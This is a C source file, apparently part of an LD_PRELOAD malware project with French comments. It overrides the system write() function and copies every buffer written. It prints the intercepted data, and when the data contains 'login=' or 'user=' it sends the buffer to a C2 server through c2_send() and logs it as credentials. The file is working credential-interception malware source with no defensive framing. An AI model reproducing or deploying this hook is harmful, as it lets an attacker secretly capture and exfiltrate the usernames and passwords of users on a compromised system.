#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include "utils.h"

void c2_send(const char *data);

// Redéfinition de la fonction 'write'
ssize_t write(int fd, const void *buf, size_t count) {
    static ssize_t (*real_write)(int, const void *, size_t) = NULL;

    if (!real_write) {
        real_write = dlsym(RTLD_NEXT, "write");
    }

    char tmp[1025];
    size_t copyLen = (count < 1024) ? count : 1024;
    memcpy(tmp, buf, copyLen);
    tmp[copyLen] = '\0';

    // Affiche les données interceptées
    fprintf(stderr, "[Intercepted] %s\n", tmp);

    // Envoie au serveur C2 et log les credentials
    if (strstr(tmp, "login=") || strstr(tmp, "user=")) {
        c2_send(tmp);
        log_credentials(tmp);
    }

    return real_write(fd, buf, count);
}
